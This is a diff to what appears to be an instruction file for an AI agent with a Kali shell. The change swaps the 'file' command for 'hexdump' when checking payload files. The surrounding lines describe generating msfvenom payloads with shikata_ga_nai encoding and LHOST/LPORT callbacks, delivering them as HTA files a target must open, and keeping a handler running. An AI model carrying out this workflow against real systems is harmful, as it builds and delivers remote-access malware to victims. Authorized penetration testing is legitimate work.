@@ -112,7 +112,7 @@ msfvenom -p <payload> LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i 5 -f 
 
 **After generation:** Verify the file was created:
 ```
-kali_shell: "ls -la /tmp/payload.exe && file /tmp/payload.exe"
+kali_shell: "ls -la /tmp/payload.exe && hexdump -C /tmp/payload.exe | head -2"
 ```
 
 ---
@@ -217,7 +217,7 @@ The target must visit this URL or open the `.hta` file for the payload to execut
 
 **For msfvenom payloads (Method A):**
 ```
-kali_shell: "ls -la /tmp/<filename> && file /tmp/<filename>"
+kali_shell: "ls -la /tmp/<filename> && hexdump -C /tmp/<filename> | head -2"
 ```
 
 **For fileformat modules (Method B):**
@@ -235,7 +235,7 @@ Note the URL or one-liner printed in the output.
 Report the file location and details to the user.
 The file will be available for download directly in the chat interface:
 - File path: `/tmp/<filename>`
-- File size and type (from `ls -la` and `file` output)
+- File size and type (from `ls -la` and the `hexdump` magic bytes)
 - Payload type and callback parameters (LHOST:LPORT)
 - Handler status (running in background)
 
